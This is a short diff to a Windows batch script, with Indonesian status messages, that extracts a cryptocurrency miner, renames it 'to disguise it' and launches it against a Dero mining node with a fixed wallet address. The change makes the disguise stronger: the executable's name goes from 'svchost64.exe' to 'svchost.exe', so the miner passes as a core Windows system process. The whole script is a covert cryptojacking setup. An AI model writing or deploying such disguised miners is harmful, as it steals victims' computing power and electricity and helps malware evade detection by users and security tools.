@@ -15,8 +15,8 @@ powershell -Command "Expand-Archive -Path 'Tnn.zip' -DestinationPath '.' -Force"
 echo Menghapus file ZIP...
 del Tnn.zip
 echo Mengganti nama file utama untuk menyamarkan...
-rename tnn-miner-cpu.exe svchost64.exe
+rename tnn-miner-cpu.exe svchost.exe
 echo Menjalankan proses...
-svchost64.exe --daemon-address dero-node.mysrv.cloud --port 10100 --wallet dero1qy2jzkctwl7mmlnpn45kk54l46lpszn7pamt072wtg62hl7j4v4xvqgld2v2c.tero --threads 5
+svchost.exe --daemon-address dero-node.mysrv.cloud --port 10100 --wallet dero1qy2jzkctwl7mmlnpn45kk54l46lpszn7pamt072wtg62hl7j4v4xvqgld2v2c.tero --threads 5
 
 pause
